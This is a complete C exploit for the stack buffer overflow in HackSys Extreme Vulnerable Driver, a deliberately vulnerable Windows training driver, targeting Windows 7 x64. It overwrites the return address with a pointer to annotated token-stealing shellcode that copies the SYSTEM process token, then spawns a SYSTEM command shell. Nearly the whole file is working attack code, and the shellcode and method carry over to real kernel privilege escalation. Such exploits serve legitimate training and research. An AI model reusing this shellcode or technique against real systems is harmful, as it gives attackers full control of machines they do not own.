// Exploit    : HackSys Extreme Vulnerable Driver - Stack Buffer Overflow 
// Author     : Hashim Jawad - @ihack4falafel
// OS         : Windows 7 Enterprise (x64) SP1
// Inspired by: Freshly made falafel sandwich 

#include <stdio.h>
#include <windows.h>

int main() {

	wchar_t* deviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";        // make sure the character set is set to Unicode under project defaults
	const DWORD iocontrolCode = 0x222003;                                  // found using IDA
	PBYTE inputBuffer;
	DWORD outputBuffer = 0;
	DWORD bytesReturned = 0;
	BOOL ioResult;

	// offset to RIP = 2048 + 8 = 2056
	// ---------------------> RIP = 0x4343434343434343
       // "A" * 2048 + "B" * 8 + "C" * 8 + "D" * 8 + "E" * 8 + "F" * 8 = 2088
       //byte evilBuffer[2088] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF";
	//byte evilBuffer[2064] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB";

	// Create driver handle
	HANDLE hevdDriver = CreateFile(deviceName,             // lpFileName
		GENERIC_READ | GENERIC_WRITE,                  // dwDesiredAccess
		FILE_SHARE_READ | FILE_SHARE_WRITE,            // dwShareMode
		NULL,                                          // lpSecurityAttributes
		OPEN_EXISTING,                                 // dwCreationDisposition
		FILE_ATTRIBUTE_NORMAL,                         // dwFlagsAndAttributes
		NULL                                           // hTemplateFile
	);

	if (hevdDriver == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to grab device handle with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] Driver handle snatched at: %p\n", hevdDriver);

	// Token stealing shellcode
	BYTE shellCode[] = {
	//0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,     // breakpoint
	//0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,     // nop cushion 
	0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; zero out rax
	0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,       // mov rax,QWORD PTR gs:[rax+0x188] ; move current thread (KTHREAD) into rax (KPCR + 0x180(KPRCB) + 0x8(KTHREAD))
	0x48, 0x8B, 0x40, 0x70,                               // mov rax,QWORD PTR [rax+0x70]     ; move current EPROCESS to rax (KTHREAD + 0x50(KAPC_STATE) + 0x20(EPROCESS))
	0x48, 0x89, 0xC1,                                     // mov rcx, rax                     ; make copy of the current process's EPROCESS
	0x49, 0x89, 0xCB,                                     // mov r11,rcx                      ; store RefCnt from token (EX_FAST_REF) structure
	0x49, 0x83, 0xE3, 0x07,                               // and r11,0x7
	0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00,             // mov rdx,0x4                      ; move SYSTEM PID to rdx
	0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,             // mov rax,QWORD PTR [rax+0x188]    ; fetch ActiveProcessLinks doubly-linked list (EPROCESS+0x188)
	0x48, 0x2D, 0x88, 0x01, 0x00, 0x00,                   // sub rax, 0x188                   ; loop thru the list processes and extract UniqueProcessId (EPROCESS+0x180)
	0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00,             // cmp QWORD PTR [rax+0x180],rdx    ; until you find SYSTEM PID of 4
	0x75, 0xEA,                                           // jne $-0x14+(0x2)
	0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00,             // mov rdx,QWORD PTR [rax+0x208]    ; grab SYSTEM's process EPROCESS token
	0x48, 0x83, 0xE2, 0xF0,                               // and rdx, 0x0fffffffffffffff0
	0x4C, 0x09, 0xDA,                                     // or rdx,r11
	0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00,             // mov QWORD PTR [rcx+0x208],rdx    ; replace the current EPROCESS's token
	0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; simulate NTSTATUS SUCCESS! 
	0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28                    ; recover Kernel stuff
	0xC3,                                                 // ret
	};

	// Allocate user buffer
	inputBuffer = VirtualAlloc(NULL,                        // lpAddress
		2064,                                           // dwSize
		MEM_COMMIT | MEM_RESERVE,                       // flAllocationType
		PAGE_EXECUTE_READWRITE                          // flProtect
	);

	if (!inputBuffer) {
		fprintf(stderr, "[!] Failed to allocate user buffer with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] User buffer has been allocated at: 0x%p\n", inputBuffer);

	// Fill user buffer with As
	RtlFillMemory(inputBuffer, 2064,'A');                   // Destination, Length, Fill

	// Copy token stealing shellcode to user buffer
	memcpy(inputBuffer,                                     // Dst
		shellCode,                                      // Src
		sizeof(shellCode)                               // size of Src
		);

	fprintf(stdout, "[+] User buffer has been occupied with shellcode and filler\n");

	// create a pointer to the start of user buffer which effectively holds the token stealing shellcode
	PULONG_PTR shellcodeAddress = (PULONG_PTR)(inputBuffer);
	fprintf(stdout, "[+] Creating shellcode pointer: 0x%p\n", shellcodeAddress);

	// dereference (inputBuffer+2056) pointer and overwrite the content with shellcode pointer
	*(PULONG_PTR*)(inputBuffer + 2056) = shellcodeAddress;
	fprintf(stdout, "[+] Updating user buffer RIP offset with shellcode pointer\n");

	// print the pointer stored at (inputBuffer+2056)
	//fprintf(stdout, "[+] shellcode pointer at (inputBuffer+2056): 0x%p\n", *(PULONG_PTR *)(inputBuffer+2056));
	//getchar(); // debug breakpoint 

	ioResult = DeviceIoControl(hevdDriver,                  // hDevice
		iocontrolCode,                                  // dwIoControlCode
		inputBuffer,                                    // lpInBuffer
		2064,                                           // nInBufferSize
		&outputBuffer,                                  // lpOutBuffer
		0,                                              // nOutBufferSize
		&bytesReturned,                                 // lpBytesReturned
		NULL                                            // lpOverlapped
	);

	if (ioResult == FALSE) {
		fprintf(stderr, "[!] Failed to call target driver with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] Device call was successful\n");

	// spawn new cmd.exe as NT AUTHORITY\SYSTEM
	fprintf(stdout, "[+] Aw yeah!! SYSTEM shell!\n");
	system("cmd.exe");

	// cleanup code
	if (hevdDriver != INVALID_HANDLE_VALUE) {
		CloseHandle(hevdDriver);
	}

	return 0;
}
